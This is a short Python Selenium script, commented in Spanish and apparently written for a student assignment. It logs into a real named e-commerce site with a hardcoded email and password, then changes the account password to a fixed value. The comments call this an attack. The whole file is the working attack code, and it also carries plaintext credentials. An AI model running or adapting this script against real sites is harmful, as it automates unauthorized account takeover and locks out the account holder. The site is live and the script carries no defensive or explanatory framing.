#se ocupo selenium
from selenium import webdriver 
from time import sleep
#datos a ingresar      
correo = "yetone7093@eoscast.com"  #nombre de usuario que corresponde al correo
password = "LA37gl85xp2f" #contraseña, se va ir probando y realizando el ataque 
contra_modificada ="12345jv"
#pagina
link = "https://www.serviceshop.cl/customer/login"
url ="https://www.serviceshop.cl/customer/edit"

#Automatizacion de inicio de sesion (nombre de usuario y contraseña)
driver = webdriver.Chrome("/home/coke/Documentos/Hito2/chromedriver")

driver.get(link)
driver.find_element_by_name("customer[email]").send_keys(correo)
driver.find_element_by_name("customer[password]").send_keys(password)
driver.find_element_by_css_selector("input[type=\"submit\" i]").click()
sleep(1)
driver.get(url)
driver.find_element_by_name("customer[password]").send_keys(contra_modificada)
driver.find_element_by_name("customer[password_confirmation]").send_keys(contra_modificada)
driver.find_element_by_css_selector("input[type=\"submit\" i]").click()
sleep(1)
driver.close()

